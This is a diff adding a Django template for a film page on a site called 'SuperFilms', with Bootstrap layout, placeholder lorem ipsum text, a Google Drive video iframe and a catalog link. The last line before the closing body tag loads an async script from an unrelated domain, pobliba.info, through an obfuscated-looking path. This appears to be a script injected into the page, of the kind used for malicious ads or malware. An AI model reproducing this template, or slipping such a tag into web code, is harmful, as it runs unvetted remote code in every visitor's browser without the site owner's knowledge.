@@ -1,0 +1,49 @@
+<html lang="en">
+<head>
+    {% load static %}
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'bootstrap/bootstrap.css' %}">
+
+    <style>
+        html {
+            font-size: 14px;
+        }
+        *{
+            background-color: black !important;
+            color: white !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 class="text-center mt-3">SuperFilms</h2>
+
+        <div class="row p-5">
+            <div class="col-12">
+                <h3>Zebro</h3>
+            </div>
+            <div class="col-3">
+                Lorem ipsum dolor sit amet consectetur, adipisicing elit. Dicta labore pariatur, magnam laboriosam blanditiis ullam accusantium sunt quisquam aliquid deleniti repellendus tempora consequatur nobis debitis minus facere excepturi dolorum aut!
+            </div>
+            <div class="w-100"></div>
+            <div class="col-6 mt-5 ml-auto mr-auto">
+                Lorem ipsum dolor, sit amet consectetur adipisicing elit. Iure eligendi nostrum vel maxime odit, error obcaecati cum praesentium et voluptas, neque itaque reprehenderit ad fugit quo? Ipsam ipsum numquam voluptatum?
+                <iframe src="https://drive.google.com/file/d/1mJIiotQk-fVHHxwXTfqP9NJE6tHA-vpP/preview" allow="autoplay"></iframe>
+            </div>
+            <div class="w-100"></div>
+            <div class="col-3 offset-9">
+                <a href="{% url 'catalog:index' %}" class="btn btn-light">Başga kinolar</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="{% static 'bootstrap/jquery-3.5.1.min.js' %}"></script>
+    <script src="{% static 'bootstrap/popper.js' %}"></script>
+    <script src="{% static 'bootstrap/bootstrap.js' %}"></script>
+    <script async language="javascript" charset="UTF-8" type="text/javascript" src="//pobliba.info/8gypw01hij650h5thc3x1x892l9urp9w890zqwx2pu8l9c6u6615a8v.js?3kgiokr8=ZCDx"></script>
+</body>
+</html>
